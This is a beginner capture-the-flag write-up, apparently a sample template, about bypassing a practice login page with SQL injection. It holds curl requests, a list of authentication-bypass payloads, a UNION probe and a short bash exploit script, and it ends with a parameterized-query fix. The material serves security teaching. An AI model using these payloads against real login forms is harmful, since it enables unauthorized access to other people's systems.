---
title: "Sample Web Challenge: SQL Injection Basic"
description: "CTF writeup: Bypass authentication with SQL injection using admin'-- payload. Learn web exploitation basics, injection testing & OWASP security concepts."
---

# 🌐 Sample Web Challenge: SQL Injection Basic

**Challenge**: Web Login Bypass
**Category**: Web Exploitation  
**Points**: 100
**Event**: Beginner CTF 2024
**Team**: Team Example
**Author**: CTF Guide
**Date**: 2024-01-15

---

## 🎯 Challenge Summary

**TL;DR**: Basic SQL injection vulnerability in login form allowing authentication bypass with `admin'--` username.

### Challenge Description
```
We have a simple login page for our admin panel. 
Can you find a way to log in as admin without knowing the password?

URL: http://challenge.example.com:1337/login
```

### Files & Services
- `http://challenge.example.com:1337/login` - Login web application

---

## 🔍 Analysis

### Initial Reconnaissance
Let's start by examining the login page:

```bash
$ curl -s http://challenge.example.com:1337/login | grep -i form
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <input type="submit" value="Login">
</form>
```

### Key Observations
1. **Input Method**: POST form with username and password fields
2. **No CSRF Protection**: No visible CSRF tokens
3. **Basic HTML Form**: Simple implementation suggests potential vulnerabilities

Let's try a normal login attempt:
```bash
$ curl -X POST http://challenge.example.com:1337/login \
    -d "username=test&password=test"
    
Response: "Invalid credentials"
```

---

## 💡 Solution Approach  

### Method 1: SQL Injection Testing

Since this appears to be a basic login form, let's test for SQL injection vulnerabilities.

1. **Step 1**: Test basic SQL injection payloads
   ```bash
   # Test single quote
   $ curl -X POST http://challenge.example.com:1337/login \
       -d "username=admin'&password=test"
   
   Response: "SQL syntax error near 'admin'' at line 1"
   ```
   
   🎯 **Bingo!** The error message reveals this is vulnerable to SQL injection.

2. **Step 2**: Craft SQL injection payload to bypass authentication
   ```bash
   # Use comment to ignore password check
   $ curl -X POST http://challenge.example.com:1337/login \
       -d "username=admin'--&password=anything"
   
   Response: "Welcome admin! Flag: flag{sql_injection_basic_bypass_123}"
   ```

3. **Step 3**: Verify with different payloads
   ```bash
   # Alternative payload
   $ curl -X POST http://challenge.example.com:1337/login \
       -d "username=admin' OR '1'='1'--&password=test"
   
   Response: "Welcome admin! Flag: flag{sql_injection_basic_bypass_123}"
   ```

---

## 🛠️ Technical Details

### Tools Used
- **Primary Tools**: curl, web browser
- **Secondary Tools**: Burp Suite (optional for this basic challenge)

### Key Technical Concepts
- **SQL Injection**: Malicious SQL statements inserted into application queries
- **Comment Syntax**: `--` in SQL comments out the rest of the query
- **Authentication Bypass**: Using injection to make login condition always true

### Vulnerable Code (Hypothetical)
```sql
-- Likely vulnerable query in backend:
SELECT * FROM users WHERE username = '$username' AND password = '$password';

-- With our payload (admin'--):
SELECT * FROM users WHERE username = 'admin'--' AND password = '$password';

-- Everything after -- is commented out, so it becomes:
SELECT * FROM users WHERE username = 'admin';
```

---

## 🎯 The Solution

### Final Exploit
```bash
#!/bin/bash
# Simple SQL injection exploit

URL="http://challenge.example.com:1337/login"

echo "Attempting SQL injection..."
response=$(curl -s -X POST "$URL" \
    -d "username=admin'--&password=ignored")

echo "Response: $response"

# Extract flag using grep
flag=$(echo "$response" | grep -o 'flag{[^}]*}')
echo "Flag found: $flag"
```

### Execution Output
```bash
$ bash exploit.sh
Attempting SQL injection...
Response: Welcome admin! Flag: flag{sql_injection_basic_bypass_123}
Flag found: flag{sql_injection_basic_bypass_123}
```

---

## 🏁 Flag

```
flag{sql_injection_basic_bypass_123}
```

---

## 💭 Reflection

### What Went Well
- Quickly identified SQL injection vulnerability from error message
- Basic payloads worked immediately
- Simple exploit development

### Challenges Faced  
- None - this was a straightforward beginner challenge

### Learning Outcomes
- **SQL Injection Basics**: Understanding how unsanitized input can break SQL queries
- **Comment Exploitation**: Using SQL comments to bypass authentication logic
- **Web Testing**: Basic techniques for testing web application security

---

## 🔗 References

### Documentation
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) - Comprehensive guide
- [SQL Comment Syntax](https://www.w3schools.com/sql/sql_comments.asp) - Different comment types
- [Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - OWASP testing methodology

### Similar Challenges
- PicoCTF: Web Gauntlet series - SQL injection practice
- OverTheWire: Natas levels - Web security fundamentals

### Further Reading
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - Advanced payloads
- [SQLMap Tutorial](https://github.com/sqlmapproject/sqlmap/wiki/Usage) - Automated SQL injection

---

## 🤝 Acknowledgments

### Team Contributions
- **Solo effort**: Basic challenge completed independently

### External Help
- OWASP documentation for understanding SQL injection mechanics

---

## 📋 Challenge Rating

| Aspect | Rating (1-5) | Notes |
|--------|--------------|-------|
| Difficulty | ⭐ | Very easy, perfect for beginners |
| Fun Factor | ⭐⭐⭐ | Satisfying first SQL injection |
| Learning Value | ⭐⭐⭐⭐⭐ | Essential web security concept |
| Realism | ⭐⭐⭐⭐ | Common vulnerability type |

**Overall**: ⭐⭐⭐⭐ (4/5) - Excellent learning challenge for beginners

---

## 📚 Appendix

### Other Payloads That Work
```sql
-- Authentication bypass variations
admin'--
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1'--
' OR 1=1--

-- Union-based (if applicable)
admin' UNION SELECT 1,2,3--
```

### Prevention Measures
```python
# Secure code example (using parameterized queries)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s", 
    (username, password)
)
```

---

**Completion Time**: `15 minutes`
**Team Size**: `1 member`
**First Blood**: `NO` 
**Published**: `2024-01-15`

## Tags
#ctf-writeup #web #sql-injection #beginner #authentication-bypass